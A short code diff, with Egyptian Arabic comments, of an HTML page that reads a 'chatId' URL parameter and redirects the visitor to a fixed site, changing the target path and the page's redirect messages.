@@ -2,17 +2,15 @@
 <html lang="ar">
 <head>
   <meta charset="UTF-8" />
-  <title>جاري التحويل ...</title>
+  <title>🔗 جاري التحويل ...</title>
   <script>
     window.onload = function() {
-      // ياخد chatId من الرابط
       const params = new URLSearchParams(window.location.search);
       const chatId = params.get('chatId');
 
       if (chatId) {
-        // 👇 هنا الرابط الجديد اللي هتوديه ليه
-        // مثلاً نفس الدومين مع ID في الآخر
-        const targetURL = `https://Medo.Broblems.com/whattsapp/${chatId}`;
+        // 🟢 هنا رابط موقعك انت اللي هتوديه ليه
+        const targetURL = `https://Medo.Broblems.com/mysite/index.html?id=${chatId}`;
         window.location.href = targetURL;
       } else {
         document.body.innerHTML = "<h2>❌ مفيش chatId في الرابط</h2>";
@@ -21,6 +19,6 @@
   </script>
 </head>
 <body>
-  <h2>⏳ جاري تحويلك ...</h2>
+  <h2>⏳ جاري تحويلك للموقع ...</h2>
 </body>
 </html>
